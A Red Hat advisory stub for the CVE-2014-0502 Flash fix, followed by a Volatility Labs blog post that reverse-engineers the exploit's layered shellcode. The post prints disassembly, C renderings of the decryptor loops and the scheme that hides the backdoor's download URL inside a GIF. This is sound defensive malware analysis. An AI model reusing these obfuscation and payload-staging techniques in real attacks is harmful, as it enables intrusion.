* [CVE-2014-0502](https://www.redhat.com/security/data/cve/CVE-2014-0502.html)

## References

* <https://access.redhat.com/security/updates/classification/#critical>
* <https://helpx.adobe.com/security/products/flash-player/apsb14-07.html>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat Enterprise Linux Server 6

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |
| i386 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |

## Red Hat Enterprise Linux Server 5

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el5.i386.rpm | SHA-256: 70fe85372438abe9287305f97fecdb21dd720b4903d3c8413f160c17289364ac |
| i386 | |
| flash-plugin-11.2.202.341-1.el5.i386.rpm | SHA-256: 70fe85372438abe9287305f97fecdb21dd720b4903d3c8413f160c17289364ac |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 6.5

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |
| i386 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |

## Red Hat Enterprise Linux Server - AUS 6.5

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |

## Red Hat Enterprise Linux Workstation 6

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |
| i386 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |

## Red Hat Enterprise Linux Workstation 5

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el5.i386.rpm | SHA-256: 70fe85372438abe9287305f97fecdb21dd720b4903d3c8413f160c17289364ac |
| i386 | |
| flash-plugin-11.2.202.341-1.el5.i386.rpm | SHA-256: 70fe85372438abe9287305f97fecdb21dd720b4903d3c8413f160c17289364ac |

## Red Hat Enterprise Linux Desktop 6

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |
| i386 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |

## Red Hat Enterprise Linux Desktop 5

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el5.i386.rpm | SHA-256: 70fe85372438abe9287305f97fecdb21dd720b4903d3c8413f160c17289364ac |
| i386 | |
| flash-plugin-11.2.202.341-1.el5.i386.rpm | SHA-256: 70fe85372438abe9287305f97fecdb21dd720b4903d3c8413f160c17289364ac |

## Red Hat Enterprise Linux Server from RHUI 6

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |
| i386 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |

## Red Hat Enterprise Linux Server from RHUI 5

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el5.i386.rpm | SHA-256: 70fe85372438abe9287305f97fecdb21dd720b4903d3c8413f160c17289364ac |
| i386 | |
| flash-plugin-11.2.202.341-1.el5.i386.rpm | SHA-256: 70fe85372438abe9287305f97fecdb21dd720b4903d3c8413f160c17289364ac |

## Red Hat Enterprise Linux Server - Extended Update Support from RHUI 6.5

| SRPM | |
| --- | --- |
| x86\_64 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |
| i386 | |
| flash-plugin-11.2.202.341-1.el6.i686.rpm | SHA-256: b61a11a0694bf529b9c38e6e2004d0edbe16d18f449cdc861991a496330907e5 |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2024 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from volatility-labs.blogspot.com_5c308d64_20250111_013701.html ===


# [[Archive of Volatility Labs]](https://volatility-labs.blogspot.com/)

**This site is an archive of the Volatility Labs blog. The blog has moved to <https://volatilityfoundation.org/volatility-blog/>**

## Tuesday, April 8, 2014

### Building a Decoder for the CVE-2014-0502 Shellcode

In late February of this year multiple security companies ([FireEye](http://www.fireeye.com/blog/technical/targeted-attack/2014/02/operation-greedywonk-multiple-economic-and-foreign-policy-sites-compromised-serving-up-flash-zero-day-exploit.html), [AlientVault](http://www.alienvault.com/open-threat-exchange/blog/analysis-of-an-attack-exploiting-the-adobe-zero-day-cve-2014-0502), [SecPod](http://secpod.org/blog/?p=1864), [Symantec](http://www.symantec.com/connect/blogs/new-flash-zero-day-linked-yet-more-watering-hole-attacks), plus many more) were reporting on a Flash zero-day vulnerability ([CVE-2014-0502](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0502)) being exploited in the wild.  Around this time a friend asked me if I could reverse the exploit and its associated files in order to write a decoder for it. The purpose of the requested decoder was to statically determine the URL from where the backdoor executable (shown later) would be downloaded.

As explained in the referenced links, the exploit found in the wild works by:

1. Having a victim's browser load a Flash file (cc.swf) that exploited the vulnerable Flash player
2. The exploit (shellcode) then downloads a GIF file (logo.gif) from the web server hosting the SWF file
3. This GIF file contains encrypted/encoded shellcode embedded within it that eventually downloads a backdoor executable from an encrypted URL within the file. Static decryption of this URL is what my friend was after

Note: For simplicity, in the steps above, I skipped some of the details on how the shellcode utilizes ROP, defeats ASLR, and finds the necessary libraries and functions (LoadLibrary, InternetOpenURL, CreateFile, etc.). If you are interested in these details please see the FireEye writeup linked above. If you are interested in how the exploit achieves arbitrary code execution then you should read the writeup from Spider Labs [here](http://blog.spiderlabs.com/2014/03/deep-analysis-of-cve-2014-0502-a-double-free-story.html). (You should probably just read the Spider Labs writeup anyway as its very well done...)

Unfortunately, many of the previous research writeups were not available at the time of my friend's request. To assist with Flash decompilation, I used [SoThink SWF decompiler](http://www.sothink.com/product/flashdecompiler/download.htm), which is a tool I cannot recommend enough, and that I have used to successfully analyze numerous Flash files. Since my effort, Zscaler has published a nice [writeup](http://research.zscaler.com/2014/02/probing-into-flash-zero-day-exploit-cve.html) on the Flash file and how it constructs its payload, although it misses a key part to writing the decoder -- how to determine where the encrypted shellcode starts within the downloaded GIF file.

Through analysis with SoThink's tool I was able to determine that the last four bytes of the GIF file contained a little endian integer that represented the offset of the encrypted payload from the beginning of where the offset is stored (the end of the file minus 4). The following decompiled function shows this process. The decompilation is from SoThink and the comments are mine:

```
1  public class cc extends Sprite
2  {
3   [snip]
4   _loc_4 = new URLLoader();
5   _loc_4.dataFormat = "binary";
6   _loc_4.addEventListener("complete", Ƿ); // sets mpsc
7   _loc_4.load(new URLRequest("logo.gif")); // get logo.gif from same server as loaded
8   [snip]
9  }
10
11 public function Ƿ(event:Event) : void
12 {
13  var _loc_3:* = new ByteArray();
14
15  /* writes logo.gif  to loc_3 */
16  _loc_3.writeBytes(event.target.data as ByteArray, 0, (event.target.data as ByteArray).length);
17
18  /* move to last 4 bytes */
19  _loc_3.position = _loc_3.length - 4;
20  _loc_3.endian = "littleEndian";
21
22  /* last four bytes of logo.gif */
23  var _loc_4:* = _loc_3.readUnsignedInt();
24  var _loc_2:* = new ByteArray();
25
26  /* length of file - integer from last 4 bytes - 4 */
27  _loc_2.writeBytes(_loc_3, _loc_3.length - 4 - _loc_4, _loc_4);
28  _loc_2.position = 0;
29
30  /* integer read from offset: length of file - integer from last 4 bytes - 4 */
31  Ǵ.setSharedProperty("mpsc", _loc_2);
32  Ǵ.start();
33
34  return;
35 }// end function
```

As can be seen on lines 4-7, which are inside the constructor of the Flash file, the logo.gif file is downloaded. The *URLLoader* instance used to download the file has its *complete* listener set to the function shown on lines 11 through 35. This function is triggered once the file is finished downloading. On line 16 the file's contents are read into an array named *\_loc\_3* (the third declared local variable) by the decompiler. On lines 19 and 20 the array's position is moved to four bytes before the end of the file and its disposition is set to little endian. On line 23 the integer at these last four bytes is read and a new byte array, *\_loc\_2* is declared. Line 27 is the key one as *\_loc\_2* is filled with the bytes of *\_loc\_3* (logo.gif) starting at the end of the file minus the integer read minus another four bytes. At this point *\_loc\_2* holds the encrypted shellcode and is stored in the *mpsc* shared property. This buffer will later be executed by the exploit payload.

Now that I knew how to find the shellcode reliably, I then needed to decrypt the shellcode in order to find the instructions that located and decrypted the embedded backdoor URL. When analyzing the shellcode I was working in a native Linux environment so I used a mix of *vim*, *dd*, and *ndisasm*. To start, I figured out the offset of the encrypted shellcode within my file and then extracted a copy of the shellcode.

The following lists the beginning of the shellcode:

```
 1 $ ndisasm -b32 stage1
 2 00000000  D9EE            fldz
 3 00000002  D97424F4        fnstenv [esp-0xc]
 4 00000006  5E              pop esi
 5 00000007  83C61F          add esi,byte +0x1f
 6 0000000A  33C9            xor ecx,ecx
 7 0000000C  66B90009        mov cx,0x900
 8 00000010  8A06            mov al,[esi]
 9 00000012  8A6601          mov ah,[esi+0x1]
10 00000015  8826            mov [esi],ah
11 00000017  884601          mov [esi+0x1],al
12 0000001A  83C602          add esi,byte +0x2
13 0000001D  E2F1            loop 0x10
14 0000001F  EE              out dx,al
15 00000020  D974D9F4        fnstenv [ecx+ebx*8-0xc]
16 00000024  2483            and al,0x83
[snip]
```

For those of you who have never used *ndisasm* before, it is the disassembler that comes with the *nasm* assembler. The *b* option defines the architecture (16, 32, or 64 bit Intel), and *ndisasm* simply treats the file as raw instructions. This makes it very useful when analyzing shellcode. In the output the first column is the offset of the instruction from the beginning of the file, the second column is the instruction's opcodes, and the third column is the instruction's mnemonic.

As you can see in the *ndisasm* output, the instructions make sense until line 14 (offset 0x1f) where the *out* instruction is used. *out* is used to talk directly with hardware devices, and as such is a privileged operation. Since this shellcode runs in userland, *out* cannot be used and even the operating system's kernel mode components use it sparingly. Examination of the instructions on lines 2 through 13 reveal a decryptor loop that targets the instructions starting at line 14. To begin, lines 2-4 leverage the floating point unit to determine the runtime address of where the *fldz* (offset 0) instruction is memory. The floating point internals that enable this are explained in an Symantec paper [here](https://www.symantec.com/avcenter/reference/evolving.shell.code.pdf) and the shellcode trick was first disclosed by noir in 2003 [here](http://www.securityfocus.com/archive/82/327100/2009-02-24/1).

Lines 5-7 then setup the loop. First 0x1f is added to the *esi* register which moves it to the offset where the *out* instruction is. *ecx* is then set to zero using *xor* and the value *0x900* is moved into the *cx* (the bottom half of *ecx*) register. This is the loop counter, so we know that the first layer of decryption will operate on 0x900 (2304) bytes. Lines 8 through 12 then implement the deobfuscation of the bytes beginning at offset 14 with an algorithm that translates to:

```
1  void stage1(unsigned char *buf)
2  {
3    unsigned char *esi;
4    int ecx;
5    unsigned char ah, al;
6
7    // add esi,byte +0x1f
8    esi = buf + 0x1f;
9
10   // xor ecx,ecx
11   // mov cx,0x900
12   ecx = 0x900;
13
14   while(ecx > 0)
15   {
16     // mov al,[esi]
17     al = *esi;
18
19     // mov ah,[esi+0x1]
20     ah = *(esi + 1);
21
22     // mov [esi],ah
23     *esi = ah;
24
25     // mov [esi+0x1],al
26     *(esi + 1) = al;
27
28     // add esi,byte +0x2
29     esi = esi + 2;
30
31     // loop 0x10
32     ecx = ecx - 1;
33   }
34 }

```

As you can see from the converted assembly, the purpose of this loop is to flip each byte with the one preceding it in the obfuscated shellcode. This is done by using the *ah* and *al* registers which are 1 byte in size each. After running the decoder above, the instructions starting at our original *out* instruction (offset 0x1f) now make sense and become the second stage of shellcode decryption:

```
 1 $ ndisasm -b32 stage2
 2 00000000  D9EE          fldz
 3 00000002  D97424F4      fnstenv [esp-0xc]
 4 00000006  5E            pop esi
 5 00000007  83C621        add esi,byte +0x21
 6 0000000A  56            push esi
 7 0000000B  5F            pop edi
 8 0000000C  33C9          xor ecx,ecx
 9 0000000E  66B9F008      mov cx,0x8f0
10 00000012  90            nop
11 00000013  66AD          lodsw
12 00000015  662D6161      sub ax,0x6161
13 00000019  C0E004        shl al,0x4
14 0000001C  02C4          add al,ah
15 0000001E  AA            stosb
16 0000001F  E2F2          loop 0x13
17 00000021  6E            outsb
18 00000022  6A6F          push byte +0x6f
19 00000024  6F            outsd
[snip]

```

As can be seen, this decryptor stage is another loop that transforms the code that follows it. Lines 2-4 contain code necessary to place *esi* at the *fldz* instruction of the second stage decryptor. Line 5 then adds 0x21 to *esi* in order to point it to the junk *outsb* instruction at line 17. The loop counter is initialized to 0x8f0 at line 9 and then lines 11 through 15 perform the transformation. This transformation can be expressed in C as:

```
1 void stage2(unsigned char *buf)
2 {
3   int ecx;
4   unsigned char *esi;
5   unsigned char *edi;
6   unsigned short ax;
7   unsigned char al, ah;
8
9   // add esi,byte +0x21
10  esi = buf + 0x21;
11
12  // push esi
13  // pop edi
14  edi = esi;
15
16  // xor ecx,ecx
17  // mov cx,0x8f0
18  ecx = 0x8f0;
19
20  while(ecx > 0)
21  {
22    // lodsw
23    ax = *(unsigned short *)esi;
24    esi = esi + 2;
25
26    // sub ax,0x6161
27    ax = ax - 0x6161;
28
29    ah = (ax >> 8) & 0xff;
30    al = ax & 0xff;
31
32    // shl al,0x4
33    al = al << 4;
34
35    // add al,ah
36    al = al + ah;
37
38    // stosb
39    *edi = al;
40    edi = edi + 1;
41
42    ecx = ecx - 1;
43   }
44 }
```

After the second stage of deobfuscation the *outsb* (line 17 from the previous *ndisasm* output) and its following instructions look like:

```
 1 $ ndisasm -b32 stage3
 2 00000000  D9EE          fldz
 3 00000002  D97424F4      fnstenv [esp-0xc]
 4 00000006  5E            pop esi
 5 00000007  83C61F        add esi,byte +0x1f
 6 0000000A  33C9          xor ecx,ecx
 7 0000000C  66B96804      mov cx,0x468
 8 00000010  8A06          mov al,[esi]
 9 00000012  8A6601        mov ah,[esi+0x1]
10 00000015  8826          mov [esi],ah
11 00000017  884601        mov [esi+0x1],al
12 0000001A  83C602        add esi,byte +0x2
13 0000001D  E2F1          loop 0x10
14 0000001F  EE            out dx,al
15 00000020  D974D9F4      fnstenv [ecx+ebx*8-0xc]
16 00000024  2483          and al,0x83
[snip]

```

You may notice that this is the same algorithm used in stage 1 for decryption, just with a different loop counter since the decrypting process is moving further down the file. By running the algorithm starting at line 14 (offset 0x1f) we get the fourth level of decryptor shellcode:

```
 1 $ ndisasm -b32 stage4
 2 00000000  D9EE          fldz
 3 00000002  D97424F4      fnstenv [esp-0xc]
 4 00000006  5E            pop esi
 5 00000007  83C616        add esi,byte +0x16
 6 0000000A  33C9          xor ecx,ecx
 7 0000000C  66B9BB08      mov cx,0x8bb
 8 00000010  803631        xor byte [esi],0x31
 9 00000013  46            inc esi
10 00000014  E2FA          loop 0x10
[snip]
```

This decryptor loop decrypts the next 0x8bb bytes using the following algorithm:

```
1 void stage4(unsigned char *buf)
2 {
3   int ecx;
4   unsigned char *esi;
5
6   // add esi,byte +0x16
7   esi = buf + 0x16;
8
9   // add esi,byte +0x16
10  // mov cx,0x8bb
11  ecx = 0x8bb;
12
13  while (ecx > 0)
14  {
15    // xor byte [esi],0x31
16    *esi = *esi ^ 0x31;
17
18    // inc esi
19    esi = esi + 1;
20
21    // loop 0x10
22    ecx = ecx - 1;
23  }
24 }

```

After running this algorithm, we finally get to the fully deobfuscated shellcode and can begin analysis:

```
 1 $ ndisasm -b32 stage5
 2 00000000  55               push ebp
 3 00000001  8BEC             mov ebp,esp
 4 00000003  81EC90010000     sub esp,0x190
 5 00000009  53               push ebx
 6 0000000A  56               push esi
 7 0000000B  57               push edi
[snip]
```

Remember that the original purpose of my friend's request was a decoder that could decrypt the encrypted URL used to download the backdoor file. The first relevant instruction that I found related to this task is at offset 0x90 in the deobfuscated function:

```
 1 00000090  E800000000        call dword 0x95
 2 00000095  5B                pop ebx
 3 00000096  83C350            add ebx,byte +0x50
 4 00000099  899D74FEFFFF      mov [ebp-0x18c],ebx
 5 0000009F  8B8574FEFFFF      mov eax,[ebp-0x18c]
 6 000000A5  813831123112      cmp dword [eax],0x12311231
 7 000000AB  740F              jz 0xbc
 8 000000AD  8B8574FEFFFF      mov eax,[ebp-0x18c]
 9 000000B3  40                inc eax
10 000000B4  898574FEFFFF      mov [ebp-0x18c],eax
11 000000BA  EBE3              jmp short 0x9f
[snip]
```

On line 1 we see a *call* instruction being made to the next instruction (*pop ebx*). This has the effect of placing the runtime address of the *pop ebx* instruction into *ebx*. 0x50 is then added to this address and a loop begins that is searching for 0x12311231 (0x31123112 on disk due to little endian) towards the end of the GIF file. This is the special marker used to denote where the encrypted URL begins. Once this marker is found, control is transferred to offset 0xbc (this check and *jmp* occurs on lines 6-7).

Starting at offset 0xbc, we have the following loop. Note that this disassembly is annoyingly long due to no optimizations being used.

```
  1 000000BC  8B8574FEFFFF      mov eax,[ebp-0x18c]
  2 000000C2  83C004            add eax,byte +0x4
  3 000000C5  898574FEFFFF      mov [ebp-0x18c],eax
  4 000000CB  8B8574FEFFFF      mov eax,[ebp-0x18c]
  5 000000D1  898580FEFFFF      mov [ebp-0x180],eax
  6 000000D7  83A588FEFFFF00    and dword [ebp-0x178],byte +0x0
  7 000000DE  8B8574FEFFFF      mov eax,[ebp-0x18c]
  8 000000E4  038588FEFFFF      add eax,[ebp-0x178]
  9 000000EA  0FBE00            movsx eax,byte [eax]
 10 000000ED  83F8FF            cmp eax,byte -0x1
 11 000000F0  744F              jz 0x141
 12 000000F2  8B8574FEFFFF      mov eax,[ebp-0x18c]
 13 000000F8  038588FEFFFF      add eax,[ebp-0x178]
 14 000000FE  0FBE00            movsx eax,byte [eax]
 15 00000101  83F012            xor eax,byte +0x12
 16 00000104  8B8D74FEFFFF      mov ecx,[ebp-0x18c]
 17 0000010A  038D88FEFFFF      add ecx,[ebp-0x178]
 18 00000110  8801              mov [ecx],al
 19 00000112  8B8574FEFFFF      mov eax,[ebp-0x18c]
 20 00000118  038588FEFFFF      add eax,[ebp-0x178]
 21 0000011E  0FBE00            movsx eax,byte [eax]
 22 00000121  83E831            sub eax,byte +0x31
 23 00000124  8B8D74FEFFFF      mov ecx,[ebp-0x18c]
 24 0000012A  038D88FEFFFF      add ecx,[ebp-0x178]
 25 00000130  8801              mov [ecx],al
 26 00000132  8B8588FEFFFF      mov eax,[ebp-0x178]
 27 00000138  40                inc eax
 28 00000139  898588FEFFFF      mov [ebp-0x178],eax
 29 0000013F  EB9D              jmp short 0xde

```

On lines 1-3 the pointer to where the marker was found is incremented by 4 to skip the marker and then placed into [ebp-0x18c]. This value is then also placed into [ebp-0x180] on line 5. The buffer holding the URL is then enumerated until an 0xff marker is found. This is accomplished by the byte comparison of -0x1 on line 10 and the bailout if found on line 11.  Lines 12 through 29 perform the decryption of the URL. The main part of this decryption is on lines 15 and 22 (shown in red) where each byte is transformed by XOR'ing with 0x12 and then subtracting 0x31.

After this analysis, we now finally know how to find and decrypt the URL:

1. Read in logo.gif
2. Search the file for 0x31123112 in little endian
3. Once found, decrypt each byte by XOR it with 0x12 and subtract 0x31
4. Stop processing when a byte of 0xff is found

After implementing the above steps I was able to give my friend a Python script that could read the decrypted URL from abitrary logo.gif files that he found through his analysis and hunting:

```
$ python decode.py logo.gif
Found \x31\x12\x31\x12 marker at offset 17764
Found 0xff, breaking URL processing loop
Download URL: http://redacted/redacted.exe
```

In the end, a simple decryptor loop is all that is needed to decrypt the URL, but it took reversing multiple stages of shellcode and runtime code modifications in order to find and understand this algorithm.

I hope that you found reading this blog post informative and interesting. I would like to thank the other members of the Volatility Team ([@iMHLv2](https://www.twitter.com/iMHLv2), [@gleeda](https://www.twitter.com/gleeda), [@4tphi](https://www.twitter.com/4tphi)) for proof reading this before I hit 'Publish' and for [@justdionysus](https://www.twitter.com/justdionysus) providing the historical references related to the use of the FPU for finding EIP. If you have any questions or comments on the post please leave a comment below, ping me on Twitter ([@attrc](https://www.twitter.com/attrc)), or shoot me an email (andrew @@@ memoryanalysis.net).

Posted by

[Andrew Case](https://www.blogger.com/profile/11014708860635242525 "author profile")

at

[9:14 AM](https://volatility-labs.blogspot.com/2014/04/building-decoder-for-cve-2014-0502.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7693961727488638788&postID=6258223664293642085&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7693961727488638788&postID=6258223664293642085&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=7693961727488638788&postID=6258223664293642085&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=7693961727488638788&postID=6258223664293642085&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7693961727488638788&postID=6258223664293642085&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7693961727488638788&postID=6258223664293642085&target=pinterest "Share to Pinterest")

Labels:
[CVE-2014-0502](https://volatility-labs.blogspot.com/search/label/CVE-2014-0502),
[malware](https://volatility-labs.blogspot.com/search/label/malware),
[volatility](https://volatility-labs.blogspot.com/search/label/volatility),
[windows](https://volatility-labs.blogspot.com/search/label/windows)

#### 1 comment:

1. ![](//www.blogger.com/img/blogger_logo_round_35.png)[KO](https://www.blogger.com/profile/08884953813659872299)[June 15, 2016 at 11:03 AM](https://volatility-labs.blogspot.com/2014/04/building-decoder-for-cve-2014-0502.html?showComment=1466002984167#c7663660820732085921)

   Excellent, excellent write up. I appreciate the granular details.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=7693961727488638788&postID=7663660820732085921)Replies
   Reply

Add commentLoad more...

[Newer Post](https://volatility-labs.blogspot.com/2014/04/volatility-memory-forensics-and-malware.html "Newer Post")

[Older Post](https://volatility-labs.blogspot.com/2014/02/training-by-volatility-project-now.html "Older Post")

[Home](https://volatility-labs.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://volatility-labs.blogspot.com/feeds/6258223664293642085/comments/default)

## Volatility Links

* [The Volatility Foundation](http://www.volatilityfoundation.org/)
* [The Art of Memory Forensics](http://www.amazon.com/gp/product/1118825098/ref%3Das_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=1118825098&linkCode=as2&tag=malwacookb-20)
* [Memory Analysis Site](http://www.memoryanalysis.net)
* [Code Repository](https://github.com/volatilityfoundation)

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).


